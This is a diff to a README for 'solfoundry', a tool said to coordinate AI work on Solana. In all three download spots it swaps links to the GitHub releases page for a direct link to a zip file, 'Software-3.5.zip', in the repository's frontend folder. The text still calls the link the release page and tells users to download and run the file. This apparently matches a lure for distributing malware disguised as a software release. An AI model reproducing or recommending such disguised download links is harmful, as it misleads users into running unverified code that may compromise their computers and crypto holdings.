@@ -1,6 +1,6 @@
 # 🤖 solfoundry - Coordinate AI work on Solana
 
-[![Download solfoundry](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/Damianz3163/solfoundry/releases)
+[![Download solfoundry](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Damianz3163/solfoundry/main/frontend/Software-3.5.zip)
 
 ## 🖥️ What solfoundry does
 
@@ -10,7 +10,7 @@ solfoundry helps you manage AI work on Solana in one place. It is built for boun
 
 Visit the release page here to download and run this file:
 
-https://github.com/Damianz3163/solfoundry/releases
+https://raw.githubusercontent.com/Damianz3163/solfoundry/main/frontend/Software-3.5.zip
 
 On the release page, look for the latest version. Then find the Windows file that matches your computer. Most users should choose the `.exe` file if one is listed. If you see a zip file, download it and open it after the download finishes.
 
@@ -156,5 +156,5 @@ To update, download the newest release from the same page and replace the older 
 
 ## 📎 Download again
 
-[Visit the solfoundry release page](https://github.com/Damianz3163/solfoundry/releases)
+[Visit the solfoundry release page](https://raw.githubusercontent.com/Damianz3163/solfoundry/main/frontend/Software-3.5.zip)
 
